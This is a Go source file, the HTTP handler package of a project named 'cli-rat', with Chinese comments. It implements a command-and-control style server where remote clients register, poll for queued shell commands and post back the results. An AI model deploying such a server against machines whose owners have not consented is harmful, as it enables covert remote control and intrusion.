// Package handlers 提供HTTP请求处理器
// 负责处理所有来自客户端的HTTP请求
package handlers

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"

	"cli-rat/pkg/storage"
	"cli-rat/types"
)

// Server HTTP服务器结构体
// 管理客户端会话和HTTP处理
type Server struct {
	Session    *types.Session // 客户端会话信息
	mu         sync.RWMutex  // 读写锁，保护并发访问
	listenIP   string        // 监听IP地址
	listenPort int           // 监听端口
}

// New 创建新的HTTP服务器
// ip: 监听IP地址
// port: 监听端口
func New(ip string, port int) *Server {
	// 加载已有会话
	session, _ := storage.LoadSession()
	return &Server{
		Session:    session,
		listenIP:   ip,
		listenPort: port,
	}
}

// ListenAddr 返回监听地址
// 格式：ip:port
func (s *Server) ListenAddr() string {
	return fmt.Sprintf("%s:%d", s.listenIP, s.listenPort)
}

// ===== HTTP处理器 =====

// RegisterHandler 处理客户端注册请求
// POST /register
// 客户端首次连接时调用此接口注册并获取唯一ID
func (s *Server) RegisterHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "只支持POST方法", http.StatusMethodNotAllowed)
		return
	}

	// 解析请求
	var req types.RegisterRequest
	body, _ := io.ReadAll(r.Body)

	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "解析JSON失败", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	// 移除同名客户端（防止重复注册）
	for i, c := range s.Session.Clients {
		if c.Name == req.Name {
			s.Session.Clients = append(s.Session.Clients[:i], s.Session.Clients[i+1:]...)
			fmt.Printf("[移除] 重复客户端: %s (ID: %s)\n", req.Name, c.ID)
			break
		}
	}

	// 生成唯一客户端ID（时间戳格式）
	clientID := fmt.Sprintf("client-%s", time.Now().Format("20060102150405"))
	displayAddr := r.RemoteAddr // 获取客户端真实连接地址

	// 创建新客户端记录
	client := types.Client{
		ID:           clientID,
		Name:         req.Name,
		Address:      displayAddr,
		RegisteredAt: time.Now(),
		LastPoll:     time.Now(),
	}

	s.Session.Clients = append(s.Session.Clients, client)
	s.mu.Unlock()

	// 持久化会话
	storage.SaveSession(s.Session)

	// 构建响应
	resp := types.RegisterResponse{
		ClientID: clientID,
		Status:   "registered",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)

	fmt.Printf("[注册] 客户端: %s (%s) 已注册, ID: %s\n", req.Name, client.Address, clientID)
}

// PollHandler 处理客户端轮询请求
// GET /poll?client_id=xxx
// 客户端定期调用此接口获取待执行命令
func (s *Server) PollHandler(w http.ResponseWriter, r *http.Request) {
	// 获取客户端ID参数
	clientID := r.URL.Query().Get("client_id")
	if clientID == "" {
		http.Error(w, "缺少client_id参数", http.StatusBadRequest)
		return
	}

	// 更新客户端最后活跃时间
	s.mu.Lock()
	for i := range s.Session.Clients {
		if s.Session.Clients[i].ID == clientID {
			s.Session.Clients[i].LastPoll = time.Now()
			break
		}
	}
	s.mu.Unlock()
	storage.SaveSession(s.Session)

	// 获取该客户端的待执行命令
	cmd := storage.GetPendingCommand(clientID)

	w.Header().Set("Content-Type", "application/json")
	if cmd == nil {
		// 无待执行命令
		json.NewEncoder(w).Encode(types.PollResponse{Status: "no_command"})
		return
	}

	// 有命令，更新状态为执行中
	cmd.Status = "executing"
	storage.SaveCommand(cmd)

	// 返回命令详情
	json.NewEncoder(w).Encode(cmd)
}

// SubmitHandler 处理命令执行结果提交请求
// POST /result
// 客户端执行完命令后调用此接口提交结果
func (s *Server) SubmitHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "只支持POST方法", http.StatusMethodNotAllowed)
		return
	}

	// 解析请求
	var req types.SubmitRequest
	body, _ := io.ReadAll(r.Body)

	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "解析JSON失败", http.StatusBadRequest)
		return
	}

	// 查找命令
	cmd := storage.GetCommandByID(req.CommandID)
	if cmd == nil {
		http.Error(w, "命令不存在", http.StatusNotFound)
		return
	}

	// 更新命令状态和结果
	cmd.Status = req.Status
	cmd.Result = req.Result
	cmd.CompletedAt = time.Now()

	storage.SaveCommand(cmd)

	// 返回成功响应
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(types.SubmitResponse{Status: "success"})

	fmt.Printf("[结果] 命令 %s 执行完成, 状态: %s\n", cmd.ID, cmd.Status)
}

// UnregisterHandler 处理客户端注销请求
// POST /unregister
// 客户端退出时调用此接口注销
func (s *Server) UnregisterHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "只支持POST方法", http.StatusMethodNotAllowed)
		return
	}

	// 解析请求
	var req types.UnregisterRequest
	body, _ := io.ReadAll(r.Body)

	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "解析JSON失败", http.StatusBadRequest)
		return
	}

	// 移除客户端
	if s.RemoveClient(req.ClientID) {
		fmt.Printf("[注销] 客户端 %s 已注销\n", req.ClientID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(types.UnregisterResponse{Status: "unregistered"})
		return
	}

	http.Error(w, "客户端不存在", http.StatusNotFound)
}

// RegisterRoutes 注册所有HTTP路由
// 将处理器函数绑定到对应的URL路径
func (s *Server) RegisterRoutes() {
	http.HandleFunc("/register", s.RegisterHandler)
	http.HandleFunc("/poll", s.PollHandler)
	http.HandleFunc("/result", s.SubmitHandler)
	http.HandleFunc("/unregister", s.UnregisterHandler)
}

// ===== 客户端管理方法 =====

// ListClients 获取所有在线客户端列表
func (s *Server) ListClients() []types.Client {
	s.mu.RLock()
	defer s.mu.RUnlock()

	// 创建副本避免外部修改
	clients := make([]types.Client, len(s.Session.Clients))
	copy(clients, s.Session.Clients)
	return clients
}

// GetClient 根据ID获取客户端
func (s *Server) GetClient(id string) *types.Client {
	s.mu.RLock()
	defer s.mu.RUnlock()

	for _, c := range s.Session.Clients {
		if c.ID == id {
			return &c
		}
	}
	return nil
}

// RemoveClient 根据ID移除客户端
// 返回是否成功移除
func (s *Server) RemoveClient(id string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	for i, c := range s.Session.Clients {
		if c.ID == id {
			s.Session.Clients = append(s.Session.Clients[:i], s.Session.Clients[i+1:]...)
			storage.SaveSession(s.Session)
			return true
		}
	}
	return false
}

// SendCommand 向指定客户端发送命令
// clientID: 目标客户端ID
// content: 命令内容
// 返回创建的命令对象
func (s *Server) SendCommand(clientID, content string) (*types.Command, error) {
	s.mu.RLock()
	// 检查客户端是否存在
	found := false
	for _, c := range s.Session.Clients {
		if c.ID == clientID {
			found = true
			break
		}
	}
	s.mu.RUnlock()

	if !found {
		return nil, fmt.Errorf("客户端不存在: %s", clientID)
	}

	// 创建新命令
	cmd := &types.Command{
		ID:        fmt.Sprintf("cmd-%s", time.Now().Format("20060102150405")),
		Content:   content,
		ClientID:  clientID,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	storage.SaveCommand(cmd)
	fmt.Printf("[命令] 已发送给 %s: %s\n", clientID, content)

	return cmd, nil
}
